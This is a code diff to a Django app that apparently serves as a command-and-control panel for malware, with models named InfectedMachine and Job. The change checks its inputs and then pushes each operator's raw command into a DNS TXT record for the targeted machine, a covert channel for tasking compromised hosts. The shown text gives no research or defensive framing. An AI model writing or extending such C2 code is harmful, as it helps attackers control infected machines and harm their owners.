@@ -22,6 +22,7 @@ from django.urls import include, path
 from django.views.decorators.http import require_POST
 
 from .models import InfectedMachine, Job
+from .services.DnsService import DnsService
 
 
 def index(request: HttpRequest):
@@ -48,12 +49,16 @@ def jobs(request: HttpRequest):
 @require_POST
 def job_create(request: HttpRequest, machine_id: int):
     machine = InfectedMachine.objects.filter(id=machine_id).first()
-    if machine.get_current_job() is not None:
+    raw_command = request.POST.get('command')
+    if machine is None or raw_command is None or machine.get_current_job() is not None:
         return redirect('machines')
 
     new_job = machine.job_set.create()
-    new_job.raw_command = request.POST.get('command')
+    new_job.raw_command = raw_command
     new_job.save()
+
+    DnsService().set_job_txt(machine, raw_command)
+
     return redirect('machines')
 
 urlpatterns = [
